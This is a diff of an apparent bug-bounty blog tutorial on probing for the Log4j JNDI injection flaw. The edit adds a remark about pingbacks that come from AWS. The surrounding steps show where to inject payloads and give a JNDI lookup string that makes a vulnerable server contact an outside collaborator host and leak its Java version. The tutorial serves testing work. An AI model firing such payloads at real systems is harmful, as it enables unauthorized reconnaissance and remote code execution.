@@ -241,7 +241,7 @@
 3. Fire the payload into input field and Find out any field which may be logged. For example, 
    the endpoint which you are accessing, User-Agent, Referrer, things which you search, something which you submit in some form, etc.<a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt">Headers.</a><br>
 <br> <img src="img/blog/step2.jpg" class="img-fluid" alt="step2"/><br>
-4. If you get the ping back then you good to go.Before that read this awesome writeup about pingbacks <a href="https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025">Pingback Doubts</a><br><br>
+4. If you get the ping back then you good to go.Before that read this awesome writeup about pingbacks <a href="https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025">Pingback Doubts</a>. Because if you are getting hit from AWS it will not consider as a hit from the application server. So, clear your all doubts from above article carefully<br><br>
 <img src="img/blog/step3.jpg" class="img-fluid" alt="step3"/> <br>
 5. For getting Java version, we’ll use this one: <code>${jndi:ldap://z${sys:java.version}.xyz.burpcollaborator.net/rce}</code><br>
 </p><br>
